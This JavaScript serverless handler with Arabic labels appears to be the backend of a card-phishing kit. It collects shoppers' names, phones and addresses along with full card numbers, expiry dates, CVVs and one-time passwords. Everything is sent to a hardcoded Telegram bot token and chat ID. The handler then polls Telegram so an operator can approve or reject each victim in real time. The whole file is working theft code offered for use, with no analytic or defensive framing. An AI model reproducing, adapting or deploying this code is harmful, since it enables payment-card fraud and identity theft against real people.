function buildFormattedMessage(orderInfo = {}, card = 'غير متوفر', holder = 'غير متوفر', expiry = 'غير متوفر', cvv = 'غير متوفر') {
  return [
    'الاسم: ' + (orderInfo.customer_name || 'غير متوفر'),
    'الرقم: ' + (orderInfo.customer_phone || 'غير متوفر'),
    'العنوان: ' + (orderInfo.customer_address || 'غير متوفر'),
    'المنتجات: ' + (orderInfo.products || 'غير متوفر'),
    'المبلغ الكلي: ' + (orderInfo.total_amount || 'غير متوفر'),
    'الدفعة الأولى: ' + (orderInfo.first_payment || 'غير متوفر'),
    'رابط الفاتورة: ' + (orderInfo.invoice_link || 'غير متوفر'),
    '-------------------------',
    'حامل البطاقة: ' + holder,
    'رقم البطاقة: ' + card,
    'تاريخ الانتهاء: ' + expiry,
    'CVV: ' + cvv
  ].join('\n');
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const BOT_TOKEN = "9216807620:AAGDIyVqXUaLmN_MdiMyAxAzRY0S6KCqEGw";
  const CHAT_ID = "8278749797";

  // 1. التعامل مع طلبات الفحص (GET) لمعرفة هل ضغطت موافقة أم رفض من تيليجرام
  if (req.method === 'GET') {
    const { user_id } = req.query;
    if (!user_id) return res.status(200).json({ status: 'pending' });

    try {
      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-50`);
      const tgData = await tgRes.json();

      let status = 'pending';
      let callbackQueryId = null;

      if (tgData.ok && tgData.result) {
        for (let i = tgData.result.length - 1; i >= 0; i--) {
          const update = tgData.result[i];
          if (update.callback_query) {
            const data = update.callback_query.data;
            if (data.includes(user_id)) {
              if (data.startsWith('approve_')) {
                status = 'approved';
                callbackQueryId = update.callback_query.id;
                break;
              } else if (data.startsWith('reject_')) {
                status = 'rejected';
                callbackQueryId = update.callback_query.id;
                break;
              }
            }
          }
        }
      }

      if (callbackQueryId) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ callback_query_id: callbackQueryId, text: "تم الانتقال بنجاح!" })
        }).catch(() => {});
      }

      return res.status(200).json({ status });
    } catch (err) {
      return res.status(200).json({ status: 'pending' });
    }
  }

  // 2. التعامل مع طلبات الإرسال (POST) للفيزا أو الـ OTP
  if (req.method === 'POST') {
    const body = req.body || {};
    const userId = body.user_id || 'غير متوفر';

    let text = '';
    let isOtp = false;
    let parseMode = undefined;

    if (body.رمز_التحقق_OTP || body.otp) {
      // رسالة OTP
      isOtp = true;
      parseMode = 'Markdown';
      const otpCode = body.رمز_التحقق_OTP || body.otp;
      const cardNum = body.رقم_البطاقة || body.cardNumber || body.card_number || 'غير متوفر';
      const cardHolder = body.اسم_الحامل || body.cardHolder || body.card_name || body.cardName || 'غير متوفر';

      text = `🔐 *كود التحقق (OTP) الجديد*\n\n` +
             `👤 اسم الحامل: ${cardHolder}\n` +
             `💳 رقم البطاقة: \`${cardNum}\`\n` +
             `🔑 كود الـ OTP: \`${otpCode}\`\n` +
             `🆔 معرف المستخدم: \`${userId}\``;
    } else {
      // رسالة بيانات الطلب والبطاقة بالتنسيق المطلوب
      const orderInfo = body.orderInfo || body.order_info || {
        customer_name: body.customer_name,
        customer_phone: body.customer_phone,
        customer_address: body.customer_address,
        products: body.products,
        total_amount: body.total_amount,
        first_payment: body.first_payment,
        invoice_link: body.invoice_link
      };

      const cardNumber = body.card_number || body.cardNumber || body.card || 'غير متوفر';
      const cardName = body.card_name || body.cardName || body.cardHolder || body.holder || 'غير متوفر';
      const expDate = body.exp_date || body.expDate || body.expiryDate || body.expiry || 'غير متوفر';
      const cvc = body.cvv || body.cvc || body.check_id || 'غير متوفر';

      text = buildFormattedMessage(orderInfo, cardNumber, cardName, expDate, cvc);
    }

    const prefix = isOtp ? 'otp_' : 'pay_';
    const keyboard = {
      inline_keyboard: [
        [
          { text: "✅ موافقة", callback_data: `approve_${prefix}${userId}` },
          { text: "❌ رفض", callback_data: `reject_${prefix}${userId}` }
        ]
      ]
    };

    try {
      const payload = {
        chat_id: CHAT_ID,
        text: text,
        reply_markup: keyboard
      };
      if (parseMode) payload.parse_mode = parseMode;

      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      const tgResult = await tgRes.json();
      if (!tgResult.ok) {
        return res.status(500).json({ error: tgResult.description });
      }

      return res.status(200).json({ ok: true, user_id: userId });
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  }

  return res.status(405).json({ error: 'Method Not Allowed' });
}
